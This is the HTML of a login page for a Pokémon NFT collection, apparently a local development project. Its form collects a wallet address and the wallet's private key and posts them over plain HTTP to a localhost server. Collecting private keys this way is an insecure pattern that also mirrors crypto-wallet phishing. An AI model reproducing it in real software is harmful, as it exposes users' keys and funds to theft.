<!DOCTYPE html>
<html>
<head>
    <title>Login to Your NFT Collection</title>
    <link rel="stylesheet" type="text/css" href="Login.css">
    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@500&display=swap" rel="stylesheet">
    <script>
        document.body.style.zoom = "30%";
    </script>
    <script src="login.js"></script>
</head>
<body>
    <div class="main">
        <div class="content">
            <h1><img  class="pokemon" src="pngegg.png" alt="Pokémon Trading Card Game"><img  class="pokemon2" src="pngwing.com.png" alt="Pokémon Trading Card Game"></h1>
            <form id="loginForm" action="http://localhost:3002/connection" method="post">
                <input type="text" id="username" name="address" placeholder="Address" required>
                <input type="password" id="password" name="privateKey" placeholder="Private Key" required>
                <button type="submit">Login</button>
            </form>
            <a >Your Favorite pokemon NFTs</a>
        </div>
    </div>
</body>
</html>
